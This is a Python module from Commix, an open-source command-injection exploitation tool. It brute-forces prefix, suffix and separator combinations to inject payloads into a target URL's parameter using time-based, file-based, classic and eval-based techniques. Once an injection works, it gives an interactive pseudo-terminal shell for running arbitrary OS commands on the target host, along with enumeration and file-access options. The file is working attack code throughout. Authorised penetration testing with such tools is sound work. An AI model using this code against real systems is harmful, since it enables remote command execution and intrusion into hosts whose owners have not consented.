#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import re
import sys
import time
import string
import random
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.utils import common
from src.core.compat import xrange
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.core.injections.controller import checks
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.core.injections.controller import shell_options
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.controller import file_access
from src.core.injections.controller import enumeration
from src.core.injections.controller import controller

"""
Exit handler
"""
def exit_handler(no_result):
  if no_result:
    if settings.VERBOSITY_LEVEL == 0 and settings.LOAD_SESSION == None:
      if not settings.RESPONSE_DELAYS:
        settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      else:
        settings.RESPONSE_DELAYS = False
    return False
  else :
    settings.print_data_to_stdout(settings.END_LINE.CR)

"""
Delete previous shells outputs.
"""
def delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique):
  if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Cleaning up the target operating system (i.e. deleting file '" + OUTPUT_TEXTFILE + "')."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE
      else:
        cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    else:
      if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
      else:
        cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)


def pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response):
  try:
    checks.alert()
    go_back = False
    go_back_again = False
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    while True:
      if go_back == True:
        break
      gotshell = checks.enable_shell(url)
      if gotshell in settings.CHOICE_YES:
        settings.print_data_to_stdout(settings.OS_SHELL_TITLE)
        if settings.READLINE_ERROR:
          checks.no_readline_module()
        while True:
          if not settings.READLINE_ERROR:
            checks.tab_autocompleter()
          settings.print_data_to_stdout(settings.END_LINE.CR + settings.OS_SHELL)
          cmd = common.read_input(message="", default="os_shell", check_batch=True)
          cmd = checks.escaped_cmd(cmd)
          if cmd.lower() in settings.SHELL_OPTIONS:
            if cmd.lower() == "quit" or cmd.lower() == "exit":
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
              checks.quit(filename, url, _ = False)
            go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE)
            if go_back and go_back_again == False:
              break
            if go_back and go_back_again:
              return True
          else:
            time.sleep(timesec)
            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
              # The main command injection exploitation.
              if settings.TIME_RELATED_ATTACK:
                if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                  check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
                else:
                  check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
                # Export injection result
                checks.time_related_export_injection_results(cmd, separator, shell, check_exec_time)
              else:
                if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                  response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
                else:
                  response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
                # Command execution results.
                shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
                shell = "".join(str(p) for p in shell)
              # Update logs with executed cmds and execution results.
              logs.executed_command(filename, cmd, shell)
              if not menu.options.ignore_session:
                session_handler.store_cmd(url, cmd, shell, vuln_parameter)
            else:
              shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
            if shell or shell != "":
              settings.print_data_to_stdout(settings.command_execution_output(shell))

            else:
              err_msg = common.invalid_cmd_output(cmd)
              settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    
      elif gotshell in settings.CHOICE_NO:
        if checks.next_attack_vector(technique, go_back) == True:
          break
        else:
          if no_result:
            return False
          else:
            if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
              delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
            return True
      elif gotshell in settings.CHOICE_QUIT:
        if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
          delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
        checks.quit(filename, url, _ = False)
      else:
        common.invalid_option(gotshell)
        pass

  except (KeyboardInterrupt, SystemExit):
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    settings.print_data_to_stdout(settings.END_LINE.CR)
    raise

  except EOFError:
    checks.EOFError_err_msg()
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    settings.print_data_to_stdout(settings.END_LINE.CR)

"""
The main Time-related exploitation proccess.
"""
def do_time_related_proccess(url, timesec, filename, http_request_method, url_time_response, injection_type, technique, tmp_path):

  counter = 1
  num_of_chars = 1
  vp_flag = True
  no_result = True
  is_encoded = False
  possibly_vulnerable = False
  false_positive_warning = False
  export_injection_info = False
  exec_time = 0
  timesec = checks.time_related_timesec()

  if settings.TIME_RELATED_ATTACK == False:
    checks.time_related_attaks_msg()
    settings.TIME_RELATED_ATTACK = None

  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    checks.reload_url_msg(technique)

  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    settings.MAXLEN = maxlen = menu.options.maxlen

  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads

  if not settings.LOAD_SESSION:
    checks.testing_technique_title(injection_type, technique)

  prefixes = settings.PREFIXES
  suffixes = settings.SUFFIXES
  separators = settings.SEPARATORS

  i = 0
  total = len(settings.WHITESPACES) * len(prefixes) * len(suffixes) * len(separators)
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
        for separator in settings.SEPARATORS:
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          exec_time_statistic = []
          if settings.LOAD_SESSION and session_handler.export_injection_points(url, technique, injection_type, http_request_method):
            try:
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.export_injection_points(url, technique, injection_type, http_request_method)
              if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                settings.TIME_BASED_STATE = True
              elif technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:  
                settings.TEMPFILE_BASED_STATE = True
                #OUTPUT_TEXTFILE = tmp_path + TAG + settings.OUTPUT_FILE_EXT
                OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
              cmd = shell = ""
              checks.check_for_stored_tamper(payload)
              settings.FOUND_EXEC_TIME = exec_time
              settings.FOUND_DIFF = exec_time - timesec
              possibly_vulnerable = True
            except TypeError:
              checks.error_loading_session_file()

          if not settings.LOAD_SESSION:
            num_of_chars = num_of_chars + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""
            # Change TAG on every request to prevent false-positive resutls.
            TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
            # The output file for file-based injection technique.
            alter_shell = menu.options.alter_shell
            tag_length = len(TAG) + 4
            if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
              #OUTPUT_TEXTFILE = tmp_path + TAG + settings.OUTPUT_FILE_EXT
              OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
            for output_length in range(1, int(tag_length)):
              try:
                # Tempfile-based decision payload (check if host is vulnerable).
                if alter_shell:
                  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                    payload = payloads.decision_alter_shell(separator, TAG, output_length, timesec, http_request_method)
                  else:
                    payload = payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                else:
                  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                    payload = payloads.decision(separator, TAG, output_length, timesec, http_request_method)
                  else:
                    payload = payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                
                vuln_parameter = ""
                exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)

                # Statistical analysis in time responses.
                exec_time_statistic.append(exec_time)
                # Injection percentage calculation
                percent, float_percent = checks.percentage_calculation(num_of_chars, total)

                if percent == 100 and no_result == True:
                  if settings.VERBOSITY_LEVEL == 0:
                    percent = settings.FAIL_STATUS
                  else:
                    percent = ""
                else:
                  if checks.time_related_shell(url_time_response, exec_time, timesec):
                    # Time related false positive fixation.
                    false_positive_fixation = False
                    if len(TAG) == output_length:

                      # Simple statical analysis
                      statistical_anomaly = True
                      if len(set(exec_time_statistic[0:5])) == 1:
                        if max(xrange(len(exec_time_statistic)), key=lambda x: exec_time_statistic[x]) == len(TAG) - 1:
                          statistical_anomaly = False
                          exec_time_statistic = []

                      if timesec <= exec_time and not statistical_anomaly:
                        false_positive_fixation = True
                      else:
                        false_positive_warning = True

                    # Identified false positive warning message.
                    if false_positive_warning:
                      timesec, false_positive_fixation = checks.time_delay_due_to_unstable_request(timesec)

                    if settings.VERBOSITY_LEVEL == 0:
                      percent = ".. (" + str(float_percent) + "%)"
                      checks.injection_process(injection_type, technique, percent)

                    # Check if false positive fixation is True.
                    if false_positive_fixation:
                      false_positive_fixation = False
                      settings.FOUND_EXEC_TIME = exec_time
                      settings.FOUND_DIFF = exec_time - timesec
                      if false_positive_warning:
                        time.sleep(timesec)
                      randv1 = random.randrange(0, 4)
                      randv2 = random.randrange(1, 5)
                      randvcalc = randv1 + randv2

                      if settings.TARGET_OS == settings.OS.WINDOWS:
                        if alter_shell:
                          # if technique == settings.INJECTION_TECHNIQUE.TIME_BASED: 
                          #   cmd = settings.WIN_PYTHON_INTERPRETER + "python.exe -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                          # else:
                          cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                        else:
                          rand_num = randv1 + randv2
                          cmd = "powershell.exe -InputFormat none write (" + str(rand_num) + ")"
                      else:
                        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                          cmd = "expr " + str(randv1) + " %2B " + str(randv2) + ""
                        else:
                          cmd = "echo $((" + str(randv1) + " %2B " + str(randv2) + "))"

                      # Set the original delay time
                      original_exec_time = exec_time

                      # Check for false positive resutls
                      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                        exec_time, output = injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, timesec, http_request_method, url, vuln_parameter, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique)
                      else:  
                        exec_time, output = injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique)

                      if checks.time_related_shell(url_time_response, exec_time, timesec):
                        if str(output) == str(randvcalc) and len(TAG) == output_length:
                          possibly_vulnerable = True
                          exec_time_statistic = 0
                          if settings.VERBOSITY_LEVEL == 0:
                            percent = settings.info_msg
                          else:
                            percent = ""
                          #break
                      else:
                        break
                    # False positive
                    else:
                      if settings.VERBOSITY_LEVEL == 0:
                        percent = ".. (" + str(float_percent) + "%)"
                        checks.injection_process(injection_type, technique, percent)
                      continue
                  else:
                    if settings.VERBOSITY_LEVEL == 0:
                      percent = ".. (" + str(float_percent) + "%)"
                      checks.injection_process(injection_type, technique, percent)
                    continue

              except (KeyboardInterrupt, SystemExit):
                if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
                raise

              except EOFError:
                checks.EOFError_err_msg()
                if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and 'cmd' in locals():
                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
                raise

              except:
                percent = ((num_of_chars * 100) / total)
                float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total*1.0)),2))
                if str(float_percent) == "100.0":
                  if no_result == True:
                    if settings.VERBOSITY_LEVEL == 0:
                      percent = settings.FAIL_STATUS
                      checks.injection_process(injection_type, technique, percent)
                    else:
                      percent = ""
                  else:
                    percent = ".. (" + str(float_percent) + "%)"
                    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                else:
                  percent = ".. (" + str(float_percent) + "%)"
              break

          # Yaw, got shellz!
          # Do some magic tricks!
          if checks.time_related_shell(url_time_response, exec_time, timesec):
            if (len(TAG) == output_length) and (possibly_vulnerable == True or settings.LOAD_SESSION and int(is_vulnerable) == settings.INJECTION_LEVEL):
              found = True
              no_result = False
              # Export session
              if not settings.LOAD_SESSION:
                shell = ""
                checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
                session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_exec_time, output_length, is_vulnerable=settings.INJECTION_LEVEL)
              else:
                whitespace = settings.WHITESPACES[0]
              if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
                OUTPUT_TEXTFILE = ""
              # Check for any enumeration options.
              enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
              # Check for any system file access options.
              file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
              # Check if defined single cmd.
              if menu.options.os_cmd:
                cmd = menu.options.os_cmd
                enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
                # Export injection result
                if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and len(output) > 1:
                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
              # Pseudo-Terminal shell
              if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
                continue
              else:
                return

  return exit_handler(no_result)
    
"""
The main results based exploitation proccess.
"""
def do_results_based_proccess(url, timesec, filename, http_request_method, injection_type, technique):

  shell = False
  counter = 1
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded = False
  stop_injection = False
  call_tmp_based = False
  next_attack_vector = False
  export_injection_info = False
  timesec = checks.time_related_timesec()
  
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
    from src.core.injections.results_based.techniques.classic import cb_payloads as payloads

  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
    from src.core.injections.results_based.techniques.eval_based import eb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
    from src.core.injections.semiblind.techniques.file_based import fb_payloads as payloads

  # Calculate all possible combinations
  if technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    for item in range(0, len(settings.EXECUTION_FUNCTIONS)):
      settings.EXECUTION_FUNCTIONS[item] = "${" + settings.EXECUTION_FUNCTIONS[item] + "("
    settings.EVAL_PREFIXES = settings.EVAL_PREFIXES + settings.EXECUTION_FUNCTIONS
    prefixes = settings.EVAL_PREFIXES
    suffixes = settings.EVAL_SUFFIXES
    separators = settings.EVAL_SEPARATORS
  else:
    prefixes = settings.PREFIXES
    suffixes = settings.SUFFIXES
    separators = settings.SEPARATORS

  if not settings.LOAD_SESSION:
    checks.testing_technique_title(injection_type, technique)
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      url_time_response = 0
      tmp_path = checks.check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
  
  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
  i = 0
  total = len(settings.WHITESPACES) * len(prefixes) * len(suffixes) * len(separators)
  for whitespace in settings.WHITESPACES:
    for prefix in prefixes:
      for suffix in suffixes:
        for separator in separators:
          if whitespace == settings.SINGLE_WHITESPACE:
            whitespace = _urllib.parse.quote(whitespace)
          # Check injection state
          settings.DETECTION_PHASE = True
          settings.EXPLOITATION_PHASE = False
          # If a previous session is available.
          if settings.LOAD_SESSION and session_handler.export_injection_points(url, technique, injection_type, http_request_method):
            try:
              url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, exec_time, output_length, is_vulnerable = session_handler.export_injection_points(url, technique, injection_type, http_request_method)
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED: 
                settings.FILE_BASED_STATE = True
                checks.check_for_stored_tamper(payload)
                #OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT
                tmp_path = ""
                OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
                if re.findall(settings.DIRECTORY_REGEX,payload):
                  filepath = re.findall(settings.DIRECTORY_REGEX,payload)[0]
                  settings.WEB_ROOT = os.path.dirname(filepath)
                  settings.CUSTOM_WEB_ROOT = True
                tmp_path = checks.check_tmp_path(url, timesec, filename, http_request_method, url_time_response)
              elif technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
                tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)
              else:
                if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
                  settings.CLASSIC_STATE = True
                elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
                  settings.EVAL_BASED_STATE = True
                checks.check_for_stored_tamper(payload)
            except TypeError:
              checks.error_loading_session_file()

          if not settings.LOAD_SESSION:
            i = i + 1
            # Check for bad combination of prefix and separator
            combination = prefix + separator
            if combination in settings.JUNK_COMBINATION:
              prefix = ""

            if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
              # The output file for file-based injection technique.
              #OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT
              OUTPUT_TEXTFILE = injector.select_output_filename(technique, tmp_path, TAG)
            else:
              randv1 = random.randrange(100)
              randv2 = random.randrange(100)
              randvcalc = randv1 + randv2

            # Define alter shell
            alter_shell = menu.options.alter_shell
            try:
              # File-based decision payload (check if host is vulnerable).
              if alter_shell:
                if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                  payload = payloads.decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE)
                else:
                  payload = payloads.decision_alter_shell(separator, TAG, randv1, randv2)
              else:
                if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                  payload = payloads.decision(separator, TAG, OUTPUT_TEXTFILE)
                else:
                  # Classic decision payload (check if host is vulnerable).
                  payload = payloads.decision(separator, TAG, randv1, randv2)

              vuln_parameter = ""
              response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
              if technique != settings.INJECTION_TECHNIQUE.FILE_BASED:
                # Try target page reload (if it is required).
                if settings.URL_RELOAD:
                  response = requests.url_reload(url, timesec)
                # Evaluate test results.
                time.sleep(timesec)
                shell = injector.injection_test_results(response, TAG, randvcalc, technique)
                if settings.VERBOSITY_LEVEL == 0:
                  percent, float_percent = checks.percentage_calculation(i, total)
                  percent = checks.print_percentage(float_percent, no_result, shell)
                  checks.injection_process(injection_type, technique, percent)
              else:
                try:
                  time.sleep(timesec)
                  output = injector.injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
                  response = checks.get_response(output)
                  if type(response) is bool:
                    html_data = ""
                  else:
                    html_data = checks.page_encoding(response, action="decode")
                  shell = re.findall(r"" + TAG + "", str(html_data))
                  if len(shell) == 0 :
                    raise _urllib.error.HTTPError(url, int(settings.NOT_FOUND_ERROR), 'Error', {}, None)
                  else: 
                    if shell[0] == TAG and not settings.VERBOSITY_LEVEL != 0:
                      percent = settings.info_msg
                      checks.injection_process(injection_type, technique, percent)

                except _urllib.error.HTTPError as e:
                  if str(e.getcode()) == settings.NOT_FOUND_ERROR:
                    percent, float_percent = checks.percentage_calculation(i, total)
                    if call_tmp_based == True:
                      exit_loops = True
                      tmp_path = os.path.split(menu.options.file_dest)[0] + "/"
                      tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response)
                      raise
                    # Show an error message, after N failed tries.
                    # Use the "/tmp/" directory for tempfile-based technique.
                    elif (i == int(menu.options.failed_tries) and no_result == True) or (i == total):
                      if i == total:
                        if checks.finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
                          continue
                        else:
                          raise
                      checks.use_temp_folder(no_result, url, timesec, filename, http_request_method, url_time_response)
                    else:
                      if checks.finalize(exit_loops, no_result, float_percent, injection_type, technique, shell):
                        continue
                      else:
                        raise

                  elif str(e.getcode()) == settings.UNAUTHORIZED_ERROR:
                    err_msg = "Authorization is required to access this page: '" + settings.DEFINED_WEBROOT + "'."
                    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                    checks.quit(filename, url, _ = False)

                  elif str(e.getcode()) == settings.FORBIDDEN_ERROR:
                    err_msg = "You do not have access to this page: '" + settings.DEFINED_WEBROOT + "'."
                    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                    checks.quit(filename, url, _ = False)

            except (KeyboardInterrupt, SystemExit):
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                # Delete previous shell (text) files (output)
                if 'vuln_parameter' in locals():
                  # settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                  delete_previous_shell(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
                raise
              else:
                settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
              raise

            except _urllib.error.URLError as e:
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                warn_msg = "It seems you do not have permission to "
                warn_msg += "read and/or write files in directory '" + settings.WEB_ROOT + "'."
                settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_warning_msg(warn_msg))
                err_msg = str(e).replace(": "," (") + ")."
                if settings.VERBOSITY_LEVEL >= 2:
                  settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
                settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
                # Provide custom server's root directory.
                if not menu.options.web_root:
                  checks.custom_web_root(url, timesec, filename, http_request_method, url_time_response)
                continue

            except EOFError:
              checks.EOFError_err_msg()
              raise
              
            except:
              if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
                raise
              else:
                continue

          # Yaw, got shellz!
          # Do some magic tricks!
          if shell:
            found = True
            no_result = False
            # Export session
            if not settings.LOAD_SESSION:
              checks.identified_vulnerable_param(url, technique, injection_type, vuln_parameter, payload, http_request_method, filename, export_injection_info, vp_flag, counter)
              session_handler.import_injection_points(url, technique, injection_type, filename, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, exec_time=0, output_length=0, is_vulnerable=settings.INJECTION_LEVEL)
            else:
              whitespace = settings.WHITESPACES[0]
            cmd = maxlen =  ""
            if not 'url_time_response' in locals():
              url_time_response = ""
            if technique != settings.INJECTION_TECHNIQUE.FILE_BASED:
              OUTPUT_TEXTFILE = ""
            # Check for any enumeration options.
            enumeration.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
            # Check for any system file access options.
            file_access.stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
             # Check if defined single cmd.
            if menu.options.os_cmd:
              enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
            # Pseudo-Terminal shell
            if pseudo_terminal_shell(injector, separator, maxlen, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, no_result, timesec, payload, OUTPUT_TEXTFILE, url_time_response) == None:
              continue
            else:
              return

  return exit_handler(no_result)